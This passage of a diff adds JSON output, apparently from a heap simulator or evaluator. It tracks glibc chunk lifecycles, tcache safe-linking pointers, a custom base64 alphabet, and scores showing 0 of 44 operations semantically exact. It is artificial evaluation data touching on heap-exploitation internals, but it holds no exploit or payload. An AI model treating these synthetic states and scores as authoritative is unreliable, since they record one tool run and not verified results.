+        "end": 3576,
+        "line": 134,
+        "suggestion": ""
+      }
+    ],
+    "symbols": {
+      "CUSTOM_B64": "'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/'",
+      "STANDARD_B64": "'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'"
+    }
+  },
+  "snapshot": {
+    "step": 44,
+    "aborted": false,
+    "chunks": {
+      "A": {
+        "address": "heap_base+0x290",
+        "user_address": "heap_base+0x2a0",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by P",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "B": {
+        "address": "heap_base+0x3a0",
+        "user_address": "heap_base+0x3b0",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by O",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "C": {
+        "address": "heap_base+0x4b0",
+        "user_address": "heap_base+0x4c0",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by N",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "D": {
+        "address": "heap_base+0x5c0",
+        "user_address": "heap_base+0x5d0",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by M",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "E": {
+        "address": "heap_base+0x6d0",
+        "user_address": "heap_base+0x6e0",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by L",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "F": {
+        "address": "heap_base+0x7e0",
+        "user_address": "heap_base+0x7f0",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by K",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "G": {
+        "address": "heap_base+0x8f0",
+        "user_address": "heap_base+0x900",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by J",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "H": {
+        "address": "heap_base+0xa00",
+        "user_address": "heap_base+0xa10",
+        "chunk_size": "0x110",
+        "lifecycle": "stale",
+        "bin_location": "reused by I",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "I": {
+        "address": "heap_base+0xa00",
+        "user_address": "heap_base+0xa10",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "J": {
+        "address": "heap_base+0x8f0",
+        "user_address": "heap_base+0x900",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "K": {
+        "address": "heap_base+0x7e0",
+        "user_address": "heap_base+0x7f0",
+        "chunk_size": "0x110",
+        "lifecycle": "freed",
+        "bin_location": "tcache[0x110]",
+        "fd": "PROTECT_PTR(heap_base+0x7f0, NULL)",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "L": {
+        "address": "heap_base+0x6d0",
+        "user_address": "heap_base+0x6e0",
+        "chunk_size": "0x110",
+        "lifecycle": "freed",
+        "bin_location": "tcache[0x110]",
+        "fd": "PROTECT_PTR(heap_base+0x6e0, K @ heap_base+0x7e0 (+0x7e0))",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "M": {
+        "address": "heap_base+0x5c0",
+        "user_address": "heap_base+0x5d0",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "N": {
+        "address": "heap_base+0x4b0",
+        "user_address": "heap_base+0x4c0",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "O": {
+        "address": "heap_base+0x3a0",
+        "user_address": "heap_base+0x3b0",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "P": {
+        "address": "heap_base+0x290",
+        "user_address": "heap_base+0x2a0",
+        "chunk_size": "0x110",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "Q": {
+        "address": "heap_base+0xb10",
+        "user_address": "heap_base+0xb20",
+        "chunk_size": "0x390",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "R": {
+        "address": "heap_base+0xea0",
+        "user_address": "heap_base+0xeb0",
+        "chunk_size": "0x390",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "S": {
+        "address": "heap_base+0x1230",
+        "user_address": "heap_base+0x1240",
+        "chunk_size": "0x3a0",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "T": {
+        "address": "heap_base+0x15d0",
+        "user_address": "heap_base+0x15e0",
+        "chunk_size": "0x3a0",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      }
+    },
+    "bins": {
+      "tcache": {
+        "0x110": [
+          "L",
+          "K"
+        ]
+      },
+      "fastbins": {},
+      "smallbins": {},
+      "largebins": {},
+      "unsorted": []
+    },
+    "warnings": []
+  },
+  "assertions": [],
+  "metrics": {
+    "operation_count": 44,
+    "expected_operation_count": 0,
+    "semantic_exact": 0,
+    "semantic_total": 44,
+    "assertions_passed": 0,
+    "assertions_total": 0,
+    "static_valid": true
+  },
+  "ai": {},
+  "strict_previews": [],
+  "feedback_compilation": [],
+  "elapsed_s": 0.109
+}
